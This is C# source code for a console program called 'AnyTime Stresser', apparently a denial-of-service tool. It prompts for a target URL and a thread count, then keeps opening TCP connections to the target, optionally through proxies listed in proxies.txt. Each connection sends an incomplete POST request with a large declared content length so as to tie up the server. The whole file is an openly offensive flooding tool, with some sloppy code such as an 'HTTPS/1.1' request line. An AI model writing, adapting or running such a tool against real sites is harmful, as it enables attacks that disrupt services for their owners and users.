using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;

namespace AnyTime_Stresser
{
    class Program
    {
        static string website;
        static int count = 0;
        static TcpClient ProxyTcpClient(string targetHost, int targetPort, string httpProxyHost, int httpProxyPort, string proxyUserName, string proxyPassword)
        {
            const BindingFlags Flags = BindingFlags.NonPublic | BindingFlags.Instance;
            Uri proxyUri = new UriBuilder
            {
                Scheme = Uri.UriSchemeHttp,
                Host = httpProxyHost,
                Port = httpProxyPort
            }.Uri;
            Uri targetUri = new UriBuilder
            {
                Scheme = Uri.UriSchemeHttps,
                Host = targetHost,
                Port = targetPort
            }.Uri;

            WebProxy webProxy = new WebProxy(proxyUri, true);
            webProxy.Credentials = new NetworkCredential(proxyUserName, proxyPassword);
            WebRequest request = WebRequest.Create(targetUri);
            request.Proxy = webProxy;
            request.Method = "CONNECT";
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream responseStream = response.GetResponseStream();
            Type responseType = responseStream.GetType();
            PropertyInfo connectionProperty = responseType.GetProperty("Connection", Flags);
            var connection = connectionProperty.GetValue(responseStream, null);
            Type connectionType = connection.GetType();
            PropertyInfo networkStreamProperty = connectionType.GetProperty("NetworkStream", Flags);
            NetworkStream networkStream = (NetworkStream)networkStreamProperty.GetValue(connection, null);
            Type nsType = networkStream.GetType();
            PropertyInfo socketProperty = nsType.GetProperty("Socket", Flags);
            Socket socket = (Socket)socketProperty.GetValue(networkStream, null);

            return new TcpClient { Client = socket };
        }
        static void Hac()
        {
            new Thread((ThreadStart)(() =>
            {
                List<TcpClient> clients = new List<TcpClient>();
                while (true)
                {
                    new Thread((ThreadStart)(() =>
                    {
                        TcpClient tcpClient = null;
                        if (File.ReadAllText(Environment.CurrentDirectory + "//proxies.txt") == "")
                        { tcpClient = new TcpClient(); }
                        else
                        {
                            foreach(string s in File.ReadAllLines(Environment.CurrentDirectory + "//proxies.txt"))
                            {
                                string[] s2 = s.Split(':');
                                tcpClient = ProxyTcpClient(website, 80, s2[0], int.Parse(s2[1]), "","");
                            }
                        }

                        clients.Add(tcpClient);
                        try
                        {
                            tcpClient.Connect(website, 80);
                            StreamWriter streamWriter = new StreamWriter(tcpClient.GetStream());
                            streamWriter.Write("POST / HTTPS/1.1\r\nHost: " + website + "\r\nContent-length: 5235\r\n\r\n");
                            streamWriter.Flush();
                            if (true)
                            {
                                Console.ForegroundColor = ConsoleColor.Cyan;
                                Console.WriteLine("Total packets sent: " + count);
                            }
                            count++;

                        }
                        catch (Exception)
                        {
                            if (true)
                            {
                                Console.ForegroundColor = ConsoleColor.Red;
                                Console.WriteLine("CANNOT POST PACKETS TO SERVER");
                            }
                        }
                    })).Start();
                    Thread.Sleep(50);
                }
             
            })).Start();
        }
        static void Main(string[] args)
        {
            try
            {
                Thread.Sleep(500);
                Console.ForegroundColor = ConsoleColor.DarkGreen;
                Console.Title = "AnyTime Stresser by dx7v2";
                string ascii = @"
     _               _____ _                  ____  _                               
    / \   _ __  _   |_   _(_)_ __ ___   ___  / ___|| |_ _ __ ___  ___ ___  ___ _ __ 
   / _ \ | '_ \| | | || | | | '_ ` _ \ / _ \ \___ \| __| '__/ _ \/ __/ __|/ _ \ '__|
  / ___ \| | | | |_| || | | | | | | | |  __/  ___) | |_| | |  __/\__ \__ \  __/ |   
 /_/   \_\_| |_|\__, ||_| |_|_| |_| |_|\___| |____/ \__|_|  \___||___/___/\___|_|   
                |___/                     By dx7v2                                          
";
                Console.WriteLine(ascii);
                Thread.Sleep(500);
                Console.ForegroundColor = ConsoleColor.Gray;
                Console.WriteLine("URL: ");
                website = Console.ReadLine();
                Console.WriteLine("Thread count: ");
                string threadS = Console.ReadLine();
                int thread = int.Parse(threadS);
                for (int i = 0; i < thread + 1; i++)
                {
                    Task.Factory.StartNew(() => Hac());
                }
                Console.ReadKey();
            }
            catch { }
        }
    }
}
